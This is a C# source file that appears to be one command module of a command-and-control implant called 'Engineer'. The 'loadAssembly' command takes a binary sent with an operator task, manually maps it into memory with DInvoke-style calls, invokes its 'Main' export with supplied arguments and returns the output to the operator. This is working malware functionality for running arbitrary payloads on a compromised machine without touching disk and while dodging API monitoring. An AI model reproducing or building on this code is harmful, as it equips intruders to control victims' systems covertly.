using System;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class LoadAssembly : EngineerCommand
    {
        public override string Name => "loadAssembly";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                task.Arguments.TryGetValue("/args", out string args);
                args = args.TrimStart(' ');
                args = args.TrimStart('\"');
                args = args.TrimEnd('\"');

                var bytesToload = task.File;
                var mappedModule = DynInv.MapModuleToMemory(bytesToload);

                object[] parameters = new object[] { args.Split(' ') };

                IntPtr address =  DynInv.GetExportAddress(mappedModule.ModuleBase, "Main");

                string output = ((string)DynInv.DynamicFunctionInvoke(address, typeof(h_DynInv.CUSTOM_DELEGATES.GenericDelegate),ref parameters));
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output, task, EngTaskStatus.Complete,TaskResponseType.String);
                // DynInv.CallMappedPEModule(mappedModule.PEINFO, mappedModule.ModuleBase);

            }
            catch(Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " +ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
                
            }
        }
    }
}
